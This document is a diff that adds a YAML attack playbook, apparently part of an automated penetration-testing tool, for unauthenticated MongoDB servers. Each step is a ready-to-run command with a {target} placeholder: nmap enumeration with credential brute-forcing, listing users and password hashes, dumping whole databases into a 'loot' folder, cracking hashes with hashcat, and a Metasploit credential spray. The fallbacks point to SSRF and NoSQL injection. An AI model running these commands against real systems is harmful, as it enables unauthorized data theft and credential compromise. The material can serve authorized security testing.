@@ -1,0 +1,39 @@
+id: service_mongodb_unauth
+title: "MongoDB — unauth enumeration + dump + JS injection"
+phase: exploit
+mitre: ["T1190", "T1530"]
+trigger:
+  services: ["mongodb", "mongo"]
+  ports:    [27017, 27018, 27019, 28017]
+keywords: ["mongodb", "mongo unauth", "nosql", "noSQLi"]
+preconditions:
+  - "TCP/27017 reachable"
+steps:
+  - tool: nmap
+    cmd:  "nmap -sV -p27017,27018 --script=mongodb-databases,mongodb-info,mongodb-brute {target}"
+    why:  "Version + DB list + light cred brute"
+  - tool: mongo
+    cmd:  "mongo --host {target} --port 27017 --eval 'db.adminCommand({listDatabases:1})'"
+    why:  "Confirm unauth + enumerate databases"
+  - tool: mongo
+    cmd:  "mongo --host {target} --port 27017 admin --eval 'db.runCommand({usersInfo:1})'"
+    why:  "Enum users + cred hashes (SCRAM-SHA-1/SHA-256)"
+  - tool: mongodump
+    cmd:  "mongodump --host {target} --port 27017 --db {database} --out ./loot/"
+    why:  "Full DB dump for offline analysis"
+  - tool: mongoexport
+    cmd:  "mongoexport --host {target} --port 27017 --db {db} --collection users --out users.json"
+    why:  "Single-collection JSON export — fast cred hunt"
+  - tool: hashcat
+    cmd:  "hashcat -m 24100 mongo_hashes.txt /usr/share/wordlists/rockyou.txt"
+    why:  "Crack SCRAM-SHA-1 cred hashes"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use auxiliary/scanner/mongodb/mongodb_login; set RHOSTS {target}; set USER_FILE users.txt; set PASS_FILE passwords.txt; run'"
+    why:  "Bulk cred spray when auth enabled"
+expected_outcome: "Full DB dump containing app data, user creds, session tokens, API keys"
+fallbacks:
+  - "REST API on 28017 → web-based admin (older mongo) often unauth"
+  - "Authentication enabled but localhost-bypass → SSRF chain via app server"
+  - "App-level NoSQLi: $ne / $gt / $where operators → see web_nosqli playbook"
+references:
+  - "https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb"
